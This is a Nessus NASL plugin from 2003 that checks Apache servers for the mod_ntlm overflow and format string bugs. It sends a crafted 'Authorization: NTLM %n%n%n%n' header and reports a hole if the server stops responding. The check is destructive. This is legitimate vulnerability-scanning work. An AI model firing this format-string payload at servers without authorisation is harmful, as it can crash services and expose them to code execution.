#
# This script was written by Renaud Deraison
#
# See the Nessus Scripts License for details
#
# Ref:
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# To: "BugTraq" <bugtraq@securityfocus.com>
# Subject: Remote Vulnerabilties in mod_ntlm
# Date: Mon, 21 Apr 2003 12:11:43 -0500



if(description)
{
 script_id(11552); 
 script_bugtraq_id(7388, 7393);

 script_version("$Revision: 1.5 $");

 name["english"] = "mod_ntlm overflow / format string bug";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host seems to be running mod_ntlm, a NTLM authentication
module for Apache.

There is a buffer overflow as well as a format string issue in this server
which may be used by an attacker to execute arbitrary code on this host.

Solution : None at this time - disable NTLM authentication
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "mod_ntlm overflow / format string";
 
 script_summary(english:summary["english"]);
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain a shell remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/apache");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


function check(loc)
{
  local_var req, res, soc, r;

  req = http_get(item:loc, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if( res == NULL ) exit(0);

  if("WWW-Authenticate: NTLM" >< res )
  {
  req = string("GET ", loc, " HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"Authorization: NTLM nnnn\r\n\r\n");
  soc = http_open_socket(port);
  if(!soc)exit(0);

  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if(!r)exit(0);
  close(soc);


  req = string("GET ", loc, " HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"Authorization: NTLM %n%n%n%n\r\n\r\n");


  soc = http_open_socket(port);
  if(!soc)exit(0);

  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if(!r){security_hole(port); exit(0); }
  close(soc);
 }
}

pages = get_kb_list(string("www/", port, "/content/auth_required"));
if(isnull(pages)) pages = make_list("/");
else pages = make_list("/", pages);


foreach page (pages)
{
 check(loc:page);
}
